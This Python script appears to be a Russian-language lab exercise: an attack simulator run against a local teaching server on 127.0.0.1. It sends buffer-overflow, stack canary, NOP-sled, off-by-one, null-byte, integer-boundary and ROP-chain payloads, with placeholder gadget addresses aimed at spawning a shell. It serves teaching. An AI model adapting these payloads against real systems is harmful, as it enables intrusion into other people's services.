
import socket
import struct

HOST = "127.0.0.1"
PORT = 9998


def connect() -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, PORT))
    banner = s.recv(1024).decode(errors="replace").strip()
    print(f"  Сервер: {banner}")
    return s


def send_cmd(s: socket.socket, cmd: str) -> str:
    try:
        s.sendall((cmd + "\r\n").encode())
        return s.recv(1024).decode(errors="replace").strip()
    except Exception as e:
        return f"[ERROR] {e}"


SEP = "=" * 55



def attack_normal():
    print(f"\n{SEP}")
    print("  АТАКА 1: Нормальный ввод (baseline, 5 байт)")
    print(SEP)
    s = connect()
    resp = send_cmd(s, "STORE Hello")
    print(f"  STORE 'Hello' (5 б)  → {resp}")
    resp = send_cmd(s, "READ")
    print(f"  READ                 → {resp}")
    resp = send_cmd(s, "STATUS")
    print(f"  STATUS               → {resp}")
    send_cmd(s, "QUIT")
    s.close()



def attack_overflow():
    print(f"\n{SEP}")
    print("  АТАКА 2: Переполнение буфера (32 байта > 16)")
    print(SEP)
    s = connect()
    payload = "A" * 32
    resp = send_cmd(s, f"STORE {payload}")
    print(f"  STORE 'A'×32 (32 б) → {resp}")
    resp = send_cmd(s, "STATUS")
    print(f"  STATUS               → {resp}")
    send_cmd(s, "QUIT")
    s.close()



def attack_canary():
    print(f"\n{SEP}")
    print("  АТАКА 3: Попытка затереть stack canary")
    print(SEP)
    s = connect()
    payload_bytes = b"A" * 16 + b"\x00" * 4 + b"\x01"
    payload_str   = payload_bytes.decode("latin-1")
    resp = send_cmd(s, f"STORE {payload_str}")
    print(f"  STORE (16 + canary + flag) {len(payload_bytes)} б → {resp}")
    resp = send_cmd(s, "STATUS")
    print(f"  STATUS → {resp}")
    send_cmd(s, "QUIT")
    s.close()



def attack_shellcode():
    print(f"\n{SEP}")
    print("  АТАКА 4: Попытка записи shell-кода (NOP-sled)")
    print(SEP)
    s = connect()
    nop_sled    = b"\x90" * 20
    fake_ret    = b"\xbe\xba\xfe\xca\xff\xff\x7f\x00"
    payload     = nop_sled + fake_ret
    payload_str = payload.decode("latin-1")
    print(f"  Payload: NOP×20 + fake_ret = {len(payload)} байт")
    print(f"  Hex: {payload.hex()}")
    resp = send_cmd(s, f"STORE {payload_str}")
    print(f"  STORE → {resp}")
    send_cmd(s, "QUIT")
    s.close()



def attack_off_by_one():
    print(f"\n{SEP}")
    print("  АТАКА 5: Off-by-one (17 байт при буфере 16)")
    print(SEP)
    s = connect()

    ok_payload = "B" * 16
    resp = send_cmd(s, f"STORE {ok_payload}")
    print(f"  STORE 'B'×16 (16 б) → {resp}")

    bad_payload = "C" * 17
    resp = send_cmd(s, f"STORE {bad_payload}")
    print(f"  STORE 'C'×17 (17 б) → {resp}")

    send_cmd(s, "QUIT")
    s.close()



def attack_huge_packet():
    print(f"\n{SEP}")
    print("  АТАКА 6: Огромный сетевой пакет (512 байт)")
    print(SEP)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        s.recv(1024)   # баннер
        huge = b"STORE " + b"Z" * 512 + b"\r\n"
        print(f"  Отправляем {len(huge)} байт напрямую в сокет...")
        s.sendall(huge)
        resp = s.recv(1024).decode(errors="replace").strip()
        print(f"  Ответ: {resp}")
        s.close()
    except Exception as e:
        print(f"  [ERROR] {e}")


def attack_cyclic_pattern():
    print(f"\n{SEP}")
    print("  АТАКА 7: Cyclic pattern (определение смещения)")
    print(SEP)

    def cyclic(length: int) -> bytes:
        charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        pattern = bytearray()
        i = 0
        while len(pattern) < length:
            pattern.append(charset[i % len(charset)])
            i += 1
        return bytes(pattern)

    def cyclic_find(pattern: bytes, needle: bytes) -> int:
        idx = pattern.find(needle)
        return idx

    pattern = cyclic(40)
    print(f"  Cyclic pattern (40 б): {pattern.decode('latin-1')}")
    print(f"  Hex: {pattern.hex()}")

    simulated_ret = pattern[20:24]
    offset = cyclic_find(pattern, simulated_ret)
    print(f"\n  Симуляция краша: ret-addr содержит {simulated_ret.hex()}")
    print(f"  cyclic_find → смещение до ret-addr = {offset} байт")
    print(f"  Вывод: нужно {offset} байт мусора, затем адрес evil-функции")

    s = connect()
    payload_str = pattern.decode("latin-1")
    resp = send_cmd(s, f"STORE {payload_str}")
    print(f"\n  STORE (40 б cyclic) → {resp}")
    send_cmd(s, "QUIT")
    s.close()



def attack_null_byte():
    print(f"\n{SEP}")
    print("  АТАКА 8: Null-byte инъекция")
    print(SEP)

    payloads = [
        (b"Hello\x00EVIL_PART",        "строка с нулём посередине"),
        (b"\x00" * 16,                 "буфер из нулей"),
        (b"data\x00" + b"A" * 20,      "null + переполнение за нулём"),
        (b"A" * 8 + b"\x00" * 8,       "половина нулей"),
    ]

    s = connect()
    for payload_bytes, desc in payloads:
        payload_str = payload_bytes.decode("latin-1")
        resp = send_cmd(s, f"STORE {payload_str}")
        print(f"  [{desc}] {len(payload_bytes)} б → {resp}")
    send_cmd(s, "QUIT")
    s.close()

def attack_integer_overflow():
    print(f"\n{SEP}")
    print("  АТАКА 9: Integer overflow (граничные размеры)")
    print(SEP)
    sizes = [
        (0,       "пустые данные (0 байт)"),
        (1,       "минимальные данные"),
        (15,      "буфер-1 (граница)"),
        (16,      "ровно буфер"),
        (17,      "буфер+1"),
        (127,     "максимум signed byte"),
        (128,     "signed byte overflow"),
        (255,     "максимум unsigned byte"),
        (256,     "256 — byte overflow"),
    ]

    s = connect()
    for size, desc in sizes:
        data  = "X" * size if size > 0 else ""
        cmd   = f"STORE {data}" if data else "STORE "
        resp  = send_cmd(s, cmd)
        label = "OK" if resp.startswith("200") else "BLOCKED"
        print(f"  [{label}] size={size:4d} ({desc}) → {resp[:55]}")
    send_cmd(s, "QUIT")
    s.close()



def attack_rop_chain():
    print(f"\n{SEP}")
    print("  АТАКА 10: ROP-цепочка (Return-Oriented Programming)")
    print(SEP)

    gadgets = [
        (0x00007F_AB12_3410, "pop rdi; ret"),
        (0x00007F_AB12_3418, "/bin/sh (строка в libc)"),
        (0x00007F_AB12_3420, "pop rsi; ret"),
        (0x00000000_00000000, "NULL"),
        (0x00007F_AB12_3428, "pop rdx; ret"),
        (0x00000000_00000000, "NULL"),
        (0x00007F_AB12_3430, "execve (syscall)"),
    ]

    print("  ROP-цепочка (7 гаджетов × 8 байт = 56 байт):")
    rop_chain = b""
    for addr, desc in gadgets:
        packed = struct.pack("<Q", addr)
        rop_chain += packed
        print(f"    0x{addr:016X}  ← {desc}")

    padding   = b"A" * 16 
    full_payload = padding + rop_chain
    print(f"\n  Полный payload: {len(padding)} б мусора + {len(rop_chain)} б ROP = {len(full_payload)} б")
    print(f"  Hex: {full_payload.hex()}")

    s = connect()
    payload_str = full_payload.decode("latin-1")
    resp = send_cmd(s, f"STORE {payload_str}")
    print(f"\n  STORE → {resp}")
    resp = send_cmd(s, "STATUS")
    print(f"  STATUS → {resp}")
    send_cmd(s, "QUIT")
    s.close()


ATTACKS = {
    "1":  ("Нормальный ввод (baseline)",        attack_normal),
    "2":  ("Переполнение буфера (32 б)",        attack_overflow),
    "3":  ("Затирание stack canary",            attack_canary),
    "4":  ("Shell-код (NOP-sled)",              attack_shellcode),
    "5":  ("Off-by-one (17 б при буфере 16)",   attack_off_by_one),
    "6":  ("Огромный сетевой пакет",            attack_huge_packet),
    "7":  ("Cyclic pattern",                    attack_cyclic_pattern),
    "8":  ("Null-byte инъекция",                attack_null_byte),
    "9":  ("Integer overflow",                  attack_integer_overflow),
    "10": ("ROP-цепочка",                       attack_rop_chain),
}


def main():
    print(SEP)
    print("  Симулятор атак — Лабораторная работа 5")
    print(SEP)
    print("Выберите атаку:")
    for k, (name, _) in ATTACKS.items():
        print(f"  {k:>2} — {name}")
    print("  11 — Все атаки по очереди")

    choice = input("\nВаш выбор: ").strip()

    if choice == "11":
        for _, fn in ATTACKS.values():
            fn()
    elif choice in ATTACKS:
        ATTACKS[choice][1]()
    else:
        print("Неверный выбор.")


if __name__ == "__main__":
    main()
